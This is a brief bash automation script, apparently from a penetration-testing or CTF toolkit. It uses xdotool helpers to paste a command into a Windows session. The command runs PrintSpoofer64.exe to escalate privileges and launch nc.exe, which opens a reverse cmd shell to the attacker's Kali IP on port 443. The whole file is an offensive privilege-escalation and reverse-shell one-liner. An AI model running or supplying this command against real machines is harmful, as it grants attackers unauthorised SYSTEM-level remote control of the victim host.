#!/bin/bash

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh

paste_command "c:\Temp\PrintSpoofer64.exe -c \"c:\Temp\nc.exe ${KALI_IP} 443 -e cmd\""
